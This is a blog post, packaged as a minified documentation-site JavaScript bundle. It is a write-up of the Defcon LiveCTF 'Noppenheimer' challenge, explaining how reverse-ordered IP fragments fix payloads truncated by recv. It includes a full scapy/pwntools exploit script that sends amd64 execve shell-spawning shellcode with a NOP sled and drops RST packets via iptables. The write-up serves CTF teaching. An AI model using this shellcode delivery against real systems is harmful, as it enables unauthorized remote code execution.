"use strict";(self.webpackChunkspr_docs=self.webpackChunkspr_docs||[]).push([[5155],{3905:(e,n,t)=>{t.d(n,{Zo:()=>d,kt:()=>u});var s=t(7294);function l(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function a(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);n&&(s=s.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,s)}return t}function r(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?a(Object(t),!0).forEach((function(n){l(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):a(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function o(e,n){if(null==e)return{};var t,s,l=function(e,n){if(null==e)return{};var t,s,l={},a=Object.keys(e);for(s=0;s<a.length;s++)t=a[s],n.indexOf(t)>=0||(l[t]=e[t]);return l}(e,n);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(s=0;s<a.length;s++)t=a[s],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(l[t]=e[t])}return l}var i=s.createContext({}),p=function(e){var n=s.useContext(i),t=n;return e&&(t="function"==typeof e?e(n):r(r({},n),e)),t},d=function(e){var n=p(e.components);return s.createElement(i.Provider,{value:n},e.children)},f="mdxType",c={inlineCode:"code",wrapper:function(e){var n=e.children;return s.createElement(s.Fragment,{},n)}},g=s.forwardRef((function(e,n){var t=e.components,l=e.mdxType,a=e.originalType,i=e.parentName,d=o(e,["components","mdxType","originalType","parentName"]),f=p(t),g=l,u=f["".concat(i,".").concat(g)]||f[g]||c[g]||a;return t?s.createElement(u,r(r({ref:n},d),{},{components:t})):s.createElement(u,r({ref:n},d))}));function u(e,n){var t=arguments,l=n&&n.mdxType;if("string"==typeof e||l){var a=t.length,r=new Array(a);r[0]=g;var o={};for(var i in n)hasOwnProperty.call(n,i)&&(o[i]=n[i]);o.originalType=e,o[f]="string"==typeof e?e:l,r[1]=o;for(var p=2;p<a;p++)r[p]=t[p];return s.createElement.apply(null,r)}return s.createElement.apply(null,t)}g.displayName="MDXCreateElement"},4771:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>i,contentTitle:()=>r,default:()=>f,frontMatter:()=>a,metadata:()=>o,toc:()=>p});var s=t(7462),l=(t(7294),t(3905));const a={slug:"scapy-revfrag",title:"One Weird Trick to fix your CTF Payloads",authors:"ltsrad",tags:["scapy","fragmentation","pwntools","tcpip"]},r=void 0,o={permalink:"/pages/blog/scapy-revfrag",source:"@site/blog/2023-09-15-noppenheimer.md",title:"One Weird Trick to fix your CTF Payloads",description:"Noppenheimer",date:"2023-09-15T00:00:00.000Z",formattedDate:"September 15, 2023",tags:[{label:"scapy",permalink:"/pages/blog/tags/scapy"},{label:"fragmentation",permalink:"/pages/blog/tags/fragmentation"},{label:"pwntools",permalink:"/pages/blog/tags/pwntools"},{label:"tcpip",permalink:"/pages/blog/tags/tcpip"}],readingTime:5.66,hasTruncateMarker:!1,authors:[{name:"Alex Radocea",url:"https://twitter.com/defendtheworld",key:"ltsrad"}],frontMatter:{slug:"scapy-revfrag",title:"One Weird Trick to fix your CTF Payloads",authors:"ltsrad",tags:["scapy","fragmentation","pwntools","tcpip"]},nextItem:{title:"How to use the SPR 1-click install on DigitalOcean",permalink:"/pages/blog/virtual-spr-1click"}},i={authorsImageUrls:[void 0]},p=[{value:"Noppenheimer",id:"noppenheimer",level:2},{value:"What Went Wrong",id:"what-went-wrong",level:2},{value:"Solving with IP Fragmentation",id:"solving-with-ip-fragmentation",level:2}],d={toc:p};function f(e){let{components:n,...a}=e;return(0,l.kt)("wrapper",(0,s.Z)({},d,a,{components:n,mdxType:"MDXLayout"}),(0,l.kt)("h2",{id:"noppenheimer"},"Noppenheimer"),(0,l.kt)("p",null,"At Defcon CTF Finals, the Final round of  ",(0,l.kt)("a",{parentName:"p",href:"https://livectf.com/"},"LiveCTF")," went into sudden death.\nThe challenge was named Noppenheimer, a play on the Oppenheimer film that was released, and NOP (NO-OP) instructions."),(0,l.kt)("p",null,'Contestants had to turn a random sequence of bytes into a gadget/shellcode cave by converting bytes into NOPs,\nby sending "nuke" Launch commands.'),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre"},"Options:\nLAUNCH x,y - Launch a test at position x,y\nVIEW - See state of test site\nENDTEST - Conclude testing\n>\n")),(0,l.kt)("p",null,"Both teams solved locally.  But they couldn't exploit Noppenheimer against the remote system."),(0,l.kt)("h2",{id:"what-went-wrong"},"What Went Wrong"),(0,l.kt)("p",null,"Teams used a single ",(0,l.kt)("inlineCode",{parentName:"p"},"read/recv")," syscall to receive to get shellcode to run. Without any delays in the program,\nthe call will return quickly and if the payload is larger than the MTU it will return partial TCP data.\nThe payloads were crashing on the remote end as they didn't have working shellcode."),(0,l.kt)("p",null,"As @ZetaTwo and @psifertex ",(0,l.kt)("a",{parentName:"p",href:"https://youtu.be/VxDnpShqloA?t=16683"},"explain"),", the conditions which cause this are\nhighly specific to the exploit with payload length, delays, and other factors. The testers exploits didnt trigger this problem."),(0,l.kt)("h2",{id:"solving-with-ip-fragmentation"},"Solving with IP Fragmentation"),(0,l.kt)("p",null,"IP Packets can be fragmented into multiple packets when they exceed the MTU size,\nwhich is the maximum amount of octets accepted at layer 2 on Ethernet."),(0,l.kt)("p",null,"By sending fragments in reverse order, it can be ensured that the recv/read call will\nget all of the data that has been sent, even beyond the MTU size."),(0,l.kt)("p",null,"Here is a python solution that combines scapy with pwntools, to run inside of a container, which does just that."),(0,l.kt)("p",null,(0,l.kt)("img",{src:t(825).Z,width:"1200",height:"600"})),(0,l.kt)("p",null,"As a bonus, it also includes a semi-working TCP implementation written in pure scapy/python."),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-python"},'#!/usr/bin/env python3\n# -*- coding: UTF-8 -*-\n# Author: alex@supernetworks.org <github.com/lts-rad>\n\'\'\'\nDemo of TCP w/ sending fragmented payloads with scapy.\n\nRun this code inside of a namespace/container. Since Linux sends RST for forged SYN packets,\nthis code will use iptables to block them.\n\n#> iptables -A OUTPUT -p tcp --tcp-flags RST RST -s <src_ip> -j DROP\n\'\'\'\nfrom scapy.all import *\nimport logging\nfrom pwn import *\n\nlogger = logging.getLogger(__name__)\n#logging.basicConfig(level=logging.DEBUG)\n#logger.setLevel(logging.DEBUG)\n\nclass TcpHandshake(object):\n\n    class RLoop(threading.Thread):\n        def __init__(self, tcp):\n            threading.Thread.__init__(self)\n            self.tcp = tcp\n\n        def handle_recv(self, pkt):\n            if pkt and pkt.haslayer(IP) and pkt.haslayer(TCP):\n                if pkt[TCP].flags & 0x3f == 0x12:   # SYN+ACK\n                    logger.debug("RCV: SYN+ACK")\n                    self.tcp.send_synack_ack(pkt)\n                    return\n                elif  pkt[TCP].flags & 4 != 0:      # RST\n                    logger.debug("RCV: RST")\n                    #raise Exception("RST")\n                    self.tcp.abort = True\n                    return\n                elif pkt[TCP].flags & 0x1 == 1:     # FIN\n                    logger.debug("RCV: FIN")\n                    self.tcp.send_finack(pkt)\n                    return\n                elif pkt[TCP].flags.A: # ACK came in?\n                    logger.debug("RCV: ACK")\n                    self.tcp.send_base = pkt[TCP].ack\n\n                    logger.debug("RCV: %s"%repr(pkt))\n                    if len(pkt[TCP].payload) > 0:\n                        self.tcp.Q += [bytes(pkt[TCP].payload)]\n                    self.tcp.send_ack(pkt)\n\n                    #great, got an ack, check the send queue for pending data\n                    while len(self.tcp.send_queue) > 0:\n                        ret = self.tcp.send_data(self.tcp.send_queue.pop(0))\n                        if ret == False:\n                            break\n\n                    return\n                else:\n                    logger.debug("? Unhandled packet")\n            return\n\n\n        def run(self):\n            ans = sniff(filter="tcp port %s"%self.tcp.target[1], lfilter=self.tcp.match_packet, prn=self.handle_recv, store=False)\n\n    def __init__(self, target, sport=31337):\n        self.seq = 0\n        self.seq_next = 0\n        self.target = target\n        self.dst = next(iter(Net(target[0])))\n        self.dport = target[1]\n        self.sport = sport #random.randrange(0, 2**16)\n        self.seq_start = random.randrange(0, 2**32)\n        # options=[(\'WScale\', 7)]\n        self.l4 = IP(version=4,dst=target[0])/TCP(sport=self.sport, dport=self.dport, flags=0,\n                                        seq=self.seq_start, window=65535)\n        self.src = self.l4.src\n        self.Q = []\n        self.abort = False\n\n\n        self.send_base = self.l4[TCP].seq\n        self.send_window = self.l4[TCP].window\n        self.last_sent = self.send_base\n        self.send_queue = []\n\n        self.last_ack  = 0\n\n        #let underlying handle ethernet\n        self.s = conf.L3socket()\n\n        self.R = self.RLoop(self)\n        self.R.start()\n        logger.debug("init: %s"%repr(target))\n\n    def start(self):\n        logger.debug("start")\n        return self.send_syn()\n\n    def match_packet(self, pkt):\n        if pkt.haslayer(IP) and pkt[IP].dst == self.l4[IP].src \\\n           and pkt.haslayer(TCP) and pkt[TCP].dport == self.sport:\n           if pkt[TCP].ack <= self.seq_next and pkt[TCP].ack >= self.seq_start:\n               return True\n           else:\n               logger.debug("ack was %d expected %d" % (pkt[TCP].ack, self.seq_next))\n        return False\n\n    def send_syn(self):\n        logger.debug("SND: SYN")\n        self.l4[TCP].flags = "S"\n        self.seq_next = self.l4[TCP].seq + 1\n        self.s.send(self.l4)\n        self.l4[TCP].seq += 1\n\n    def send_synack_ack(self, pkt):\n        logger.debug("SND: SYN+ACK -> ACK with ack # %d" % (pkt[TCP].seq + 1))\n        self.l4[TCP].ack = pkt[TCP].seq + 1\n        self.l4[TCP].flags = "A"\n        self.seq_next = self.l4[TCP].seq\n        self.s.send(self.l4)\n\n    def send_data(self, d):\n        if self.abort == True:\n            print("[-] not sending data, aborted !!!")\n            return False\n        self.l4[TCP].flags = "PA"\n\n        available = self.send_base + self.send_window - self.last_sent\n\n        if available == 0:\n            self.send_queue += [d]\n            # have to wait\n            return False\n        assert available >= 0\n\n        if available < len(d):\n            d, chop = d[:available], d[available:]\n            self.send_queue += [chop]\n\n        self.seq_next = self.l4[TCP].seq + len(d)\n        self.last_sent = self.seq_next\n        tosend = self.l4/d\n\n        self.s.send(tosend)\n        self.l4[TCP].seq += len(d)\n        return True\n\n    def send_frag_data(self, d, sz):\n        if self.abort == True:\n            print("[-] not sending data, aborted !!!")\n            return\n        assert sz >= 8\n        self.l4[TCP].flags = "PA"\n\n        #tbd send window handling for fragments(?)\n        dat = self.l4/d\n        fragments = fragment(dat, sz)\n        for f in fragments[::-1]:\n            self.s.send(f)\n\n        self.seq_next = self.l4[TCP].seq + len(d)\n        self.last_sent = self.seq_next\n        self.l4[TCP].seq += len(d)\n        return True\n\n    def send_fin(self):\n        logger.debug("SND: FIN")\n        self.l4[TCP].flags = "F"\n        self.seq_next = self.l4[TCP].seq + 1\n        self.s.send(self.l4)\n        self.l4[TCP].seq += 1\n\n    def send_rst(self):\n        logger.debug("SND: RST")\n        self.l4[TCP].flags = "R"\n        self.seq_next = self.l4[TCP].seq + 1\n        self.s.send(self.l4)\n        self.l4[TCP].seq += 1\n\n    def send_finack(self, pkt):\n        logger.debug("SND: FIN+ACK")\n        self.l4[TCP].flags = "FA"\n        self.l4[TCP].ack = pkt[TCP].seq + 1\n        self.seq_next = self.l4[TCP].seq + 1\n        self.s.send(self.l4)\n        self.l4[TCP].seq += 1\n        #raise Exception("FIN+ACK")\n        self.abort = True\n\n    def send_ack(self, pkt):\n        self.l4[TCP].flags = "A"\n\n        self.last_ack = pkt[TCP].ack\n        to_acknowledge = len(pkt[TCP].payload)\n        #logger.debug("SND: ACK with ack # %d" % (pkt[TCP].seq + len(pkt[TCP].load)))\n\n        if to_acknowledge != 0:\n            self.l4[TCP].ack = pkt[TCP].seq + to_acknowledge\n            self.s.send(self.l4)\n\n    def recv(self, timeout):\n        elapsed = 0\n        while (timeout != 0) and (elapsed < timeout):\n            if len(self.Q) > 0:\n                retval = self.Q.pop(0)\n                return retval\n            time.sleep(0.01)\n            elapsed += 0.\n        #returning nothing\n        return ""\n\n    def clear_recv(self):\n        self.Q = []\n\n    def wait_all_acks(self, timeout=0):\n        elapsed = 0\n        delta = 0.1\n        while (timeout != 0) and (elapsed < timeout):\n            if self.last_ack == self.seq_next and len(self.send_queue) == 0:\n                return True\n            time.sleep(delta)\n            elapsed += delta\n        return False\n\n\n\nif __name__== \'__main__\':\n    sport = random.randint(40000, 60000)\n    os.system("iptables -F OUTPUT")\n    os.system("iptables -A OUTPUT -p tcp --sport %d --tcp-flags RST RST -j DROP"%sport)\n    conf.verb = 0\n\n    tcp_hs = TcpHandshake(("172.17.0.2", 31337), sport=sport)\n\n    r = tubes.sock.sock()\n    r.send = tcp_hs.send_data\n    r.recv = tcp_hs.recv\n    tcp_hs.start()\n\n    tosend = b""\n    def nuke(offset):\n        global tosend\n        # scapy send is slow. to speed it up,\n        # chunk the commands\n        if len(tosend) > 400:\n            r.send(tosend)\n            tosend = b""\n\n        tosend += b\'LAUNCH %d,%d\\n\'%(offset%0x10,offset//0x10)\n\n    def nukes(a, b):\n        for i in range(a, b):\n            nuke(i)\n\n\n    nukes(0, 0x40)\n    nukes(0x50, 0x58)\n    nukes(0x5b, 0x60)\n    nukes(0x70, 0xb0)\n    nukes(0xc0, 0xc3)\n\n    nukes(0xc6, 0xc7)\n    nukes(0xca, 0xd0)\n    nuke(0xdc)\n    nukes(0xe0, 0xec)\n    nukes(0xed, 0xf0)\n\n    nukes(0x108, 0x10c)\n    nukes(0x10d, 0x473)\n    nukes(0x495, 0xc17)\n    nuke(0)\n\n    if tosend:\n        r.send(tosend)\n\n    tosend = b\'ENDTEST\\n\'\n    r.send(tosend)\n\n    context.arch = \'amd64\'\n    sc = b\'\\x90\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05\'\n\n    print("******** sending shellcode ***********")\n    d = b\'\\x90\' * (0xd00+200) + sc\n\n    tcp_hs.send_frag_data(d, 100)\n    #raw_input()\n\n    r.recvuntil(b\'ENDTEST\')\n\n    #raw_input("Ready?")\n    print("Waiting for data to come in...")\n    time.sleep(2)\n    tcp_hs.clear_recv()\n    print("[+] Good")\n\n    try:\n        r.interactive()\n    except:\n        print(\'aborted\')\n\n    print("over")\n    raw_input()\n    os.system("iptables -F OUTPUT")\n    tcp_hs.send_fin()\n    tcp_hs.send_rst()\n')),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre"},'FROM python:3.8-slim\n\n# Set the working directory\nWORKDIR /app\n\n# Install system dependencies\nRUN apt-get update && apt-get install -y libpcap-dev\n\n# Install Scapy using pip\nRUN pip install scapy pwntools\nRUN pip uninstall pyelftools -y\nRUN pip install pyelftools==0.29\n\nRUN apt-get install -y iptables net-tools\nRUN apt-get install -y tmux tcpdump iproute2\nCOPY connect.py .\n\nENTRYPOINT ["/app/connect.py"]\n')))}f.isMDXComponent=!0},825:(e,n,t)=>{t.d(n,{Z:()=>s});const s=t.p+"assets/images/noppenheimer-772f2f7deb2622bf2c0904c024b136ef.gif"}}]);